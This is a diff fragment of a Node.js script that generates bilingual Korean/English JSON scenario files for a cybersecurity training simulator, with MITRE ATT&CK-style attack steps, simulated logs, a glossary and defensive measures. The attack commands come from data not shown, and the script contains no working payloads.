+        {"label":"⚡ 실행","labelEn":"⚡ Execution","steps":[1]},
+        {"label":"🎯 공격","labelEn":"🎯 Attack","steps":[2]},
+        {"label":"🔍 탐지 & 방어","labelEn":"🔍 Detection & Defense","steps":[3]}
+      ],
+      topoNodes: [
+        {"id":"attacker","label":"Attacker","x":50,"y":80},
+        {"id":"target","label":"Target\nSystem","x":200,"y":80},
+        {"id":"internal","label":"Internal\nNetwork","x":350,"y":80},
+        {"id":"c2","label":"C2\nServer","x":480,"y":80}
+      ],
+      topoEdges: [
+        {"from":"attacker","to":"target","minStep":1},
+        {"from":"target","to":"internal","minStep":2},
+        {"from":"internal","to":"c2","minStep":2}
+      ],
+      desktopIcons: [
+        {"name":"Terminal","icon":"💻"},
+        {"name":"File Manager","icon":"📁"},
+        {"name":"Browser","icon":"🌐"},
+        {"name":"Monitor","icon":"📊"},
+        {"name":"SIEM","icon":"🔍"}
+      ],
+      steps: [
+        {
+          cmd: c.term.join('\n'),
+          out: `[실행 결과]\n${c.atk.map(a => a.replace(/<[^>]*>/g, '')).join('\n')}\n\n[탐지 지표]\n⚠️ 비정상 활동 탐지`,
+          def: `[SIEM] ${c.en} activity detected — suspicious execution pattern`,
+          defAction: `Tool: ${c.en} analysis\nTechnique: ${c.id}\nTarget: System under attack\nRisk Level: High\nAction: Investigate and contain`,
+          desc: c.atk[0] ? c.atk[0].replace(/<[^>]*>/g, '') : c.ko,
+          descEn: `${c.en} technique execution detected and analyzed.`,
+          stepTitle: `${c.ko} 기법 분석`,
+          stepTitleEn: `${c.en} Technique Analysis`,
+          feynman: `공격자가 ${c.ko} 기법을 사용하여 시스템에 접근합니다. 이는 정상적인 도구나 기능을 악용하는 방식입니다.`,
+          feynmanEn: `The attacker uses the ${c.en} technique to access the system, abusing legitimate tools or features.`,
+          expert: c.c1.replace(/<[^>]*>/g, '').substring(0, 300),
+          expertEn: `${c.en}: This technique leverages legitimate system capabilities for malicious purposes.`,
+          defTooltip: `🔐 ${c.ko} 기법 탐지!`,
+          defTooltipEn: `🔐 ${c.en} technique detected!`,
+          hackerLog: {title:"attack.log",lines:[`[00:00] ${c.ko} 시작`,`[00:05] 시스템 접근`,`[00:10] 명령 실행`,`[00:15] 활동 완료`]},
+          terms: [
+            {term: c.en, def: c.desc},
+            {term: "IoC", def: "Indicator of Compromise, 침해 지표"}
+          ]
+        },
+        {
+          cmd: `# ${c.ko} 공격 실행\n${c.term.slice(0, 4).join('\n')}`,
+          out: `[공격 실행 결과]\n✅ 명령 실행 성공\n✅ 시스템 접근 확보\n⚠️ 비정상 활동 시작\n\n[수집 정보]\n- 시스템 정보 수집 완료\n- 네트워크 구조 파악\n- 추가 공격 벡터 식별`,
+          def: `[EDR] Suspicious ${c.en} execution — abnormal process behavior detected`,
+          defAction: `Tool: ${c.en} execution\nStatus: Active\nImpact: System compromised\nRisk Level: Critical\nAction: Isolate system, forensic analysis`,
+          desc: `${c.ko} 기법으로 시스템에서 악성 명령을 실행하고 추가 공격을 위한 정보를 수집합니다.`,
+          descEn: `Execute malicious commands via ${c.en} and gather information for further attacks.`,
+          stepTitle: `${c.ko} 실행 + 정보 수집`,
+          stepTitleEn: `${c.en} Execution + Intelligence Gathering`,
+          feynman: `공격자가 시스템의 정상 도구를 악용하여 명령을 실행합니다. 이 도구가 원래 합법적이기 때문에 보안 솔루션이 쉽게 탐지하지 못합니다.`,
+          feynmanEn: `The attacker abuses legitimate system tools. Since these tools are normally legal, security solutions have difficulty detecting the activity.`,
+          expert: `${c.en} 기법은 MITRE ATT&CK 프레임워크의 ${c.tactic} 전술에 분류됩니다. 정상 시스템 도구를 악용하는 Living Off the Land(LOL) 기법의 일종으로, 전통적인 시그니처 기반 탐지를 우회합니다.`,
+          expertEn: `${c.en} is classified under ${c.tactic} in MITRE ATT&CK. As a Living Off the Land technique, it bypasses traditional signature-based detection.`,
+          defTooltip: `🔐 ${c.ko} 실행 탐지!`,
+          defTooltipEn: `🔐 ${c.en} execution detected!`,
+          hackerLog: {title:"execution.log",lines:[`[00:20] 명령 실행 시작`,`[00:25] 시스템 정보 수집`,`[00:30] 네트워크 스캔`,`[00:35] 추가 공격 준비`]},
+          terms: [
+            {term: "LOL", def: "Living Off the Land, 정상 시스템 도구를 악용하는 공격 기법"},
+            {term: "EDR", def: "Endpoint Detection and Response, 엔드포인트 위협 탐지 및 대응"}
+          ]
+        },
+        {
+          cmd: `# ${c.ko} 심화 공격\n# 지속성 확보 및 횡이동`,
+          out: `[심화 공격 결과]\n✅ 지속성 확보\n✅ 권한 상승\n✅ 횡이동 시도\n\n[피해 범위]\n- 시스템 완전 장악\n- 내부 네트워크 접근\n- 데이터 유출 가능`,
+          def: `[SIEM] ${c.en} — lateral movement and persistence established`,
+          defAction: `Tool: ${c.en} + lateral movement\nPersistence: Established\nPrivilege: Elevated\nLateral Movement: Active\nRisk Level: Critical\nAction: Network-wide containment`,
+          desc: `${c.ko}를 통해 지속성을 확보하고 내부 네트워크로 횡이동합니다.`,
+          descEn: `Establish persistence via ${c.en} and move laterally within the internal network.`,
+          stepTitle: `지속성 확보 + 횡이동`,
+          stepTitleEn: `Persistence + Lateral Movement`,
+          feynman: `공격자가 하나의 문(시스템)을 열고 나서, 그 문이 다시 잠기지 않도록 테이프(지속성)를 붙이고, 다른 방(시스템)으로 이동합니다.`,
+          feynmanEn: `After opening one door (system), the attacker tapes it open (persistence) and moves to other rooms (systems).`,
+          expert: c.def.map(d => d.replace(/<[^>]*>/g, '')).join(' '),
+          expertEn: `Defense measures include monitoring, access control, and regular auditing of ${c.en} activities.`,
+          defTooltip: `🔐 지속성 + 횡이동 탐지!`,
+          defTooltipEn: `🔐 Persistence + lateral movement detected!`,
+          hackerLog: {title:"persist.log",lines:[`[00:40] 지속성 메커니즘 설치`,`[00:45] 권한 상승`,`[00:50] 횡이동 시작`,`[00:55] 추가 시스템 장악`]},
+          terms: [
+            {term: "Persistence", def: "지속성, 시스템 재시작 후에도 접근을 유지하는 기법"},
+            {term: "Lateral Movement", def: "횡이동, 초기 침투 후 내부 네트워크의 다른 시스템으로 이동"}
+          ]
+        },
+        {
+          cmd: `# ${c.ko} 탐지 및 방어\n# 종합 대응`,
+          out: `[방어 조치]\n${c.def.map(d => '✅ ' + d.replace(/<[^>]*>/g, '')).join('\n')}\n\n[모니터링]\n✅ SIEM 규칙 적용\n✅ EDR 정책 업데이트\n✅ 정기 감사 시작`,
+          def: `[SIEM] ${c.en} defense deployed — comprehensive monitoring and controls`,
+          defAction: `Tool: Defense deployment\nControls: ${c.def.length} measures implemented\nMonitoring: Active\nRisk Level: Low (with implementation)\nAction: Maintain and quarterly review`,
+          desc: `${c.ko}에 대한 종합 방어 체계를 구축합니다. 모니터링, 접근 제어, 정기 감사를 적용합니다.`,
+          descEn: `Build comprehensive defense against ${c.en}. Apply monitoring, access control, and regular audits.`,
+          stepTitle: `${c.ko} 종합 방어`,
+          stepTitleEn: `${c.en} Comprehensive Defense`,
+          feynman: `여러 겹의 그물(방어 계층)을 쳐서 공격자가 어떤 경로로 들어와도 잡을 수 있게 합니다. 문마다 경보기(모니터링)를 달고, 정기적으로 순찰(감사)합니다.`,
+          feynmanEn: `Cast multiple nets (defense layers) to catch attackers regardless of entry path. Install alarms on every door (monitoring) and patrol regularly (audits).`,
+          expert: `${c.en} 방어는 탐지(Detection), 예방(Prevention), 대응(Response)의 세 축으로 구성됩니다. MITRE D3FEND 프레임워크를 참조하여 각 기법에 맞는 대응 기술을 매핑합니다.`,
+          expertEn: `${c.en} defense consists of Detection, Prevention, and Response. Reference MITRE D3FEND framework to map countermeasures for each technique.`,
+          defTooltip: `🔐 ${c.ko} 방어 체계 완성!`,
+          defTooltipEn: `🔐 ${c.en} defense system complete!`,
+          hackerLog: {title:"defense.log",lines:["[01:00] 방어 체계 배포","[01:05] SIEM 규칙 적용","[01:10] EDR 정책 업데이트","[01:15] 정기 감사 시작"]},
+          terms: [
+            {term: "D3FEND", def: "MITRE의 방어 기법 프레임워크, ATT&CK 기법에 대한 대응 기술 매핑"},
+            {term: "Defense in Depth", def: "심층 방어, 여러 계층의 보안 통제를 적용하는 전략"}
+          ]
+        }
+      ],
+      processTree: {
+        name: "init/systemd",
+        pid: 1,
+        children: [{
+          name: c.en.toLowerCase().replace(/\s+/g, '_'),
+          pid: 1000,
+          children: [{ name: "malicious_payload", pid: 1100, children: [] }]
+        }]
+      }
+    };
+
+    const jsonStr = JSON.stringify(jsonObj, null, 2);
+    try {
+      JSON.parse(jsonStr); // Validate
+      fs.writeFileSync(jsonPath, jsonStr, 'utf8');
+      count++;
+      console.log(`[JSON] ${c.id} → ${c.id}.json`);
+    } catch(e) {
+      console.error(`[ERROR] Invalid JSON for ${c.id}: ${e.message}`);
+    }
+  } else {
+    console.log(`[SKIP] ${jsonPath} already exists`);
+  }
+}
+
+console.log(`\nTotal generated: ${count} files`);
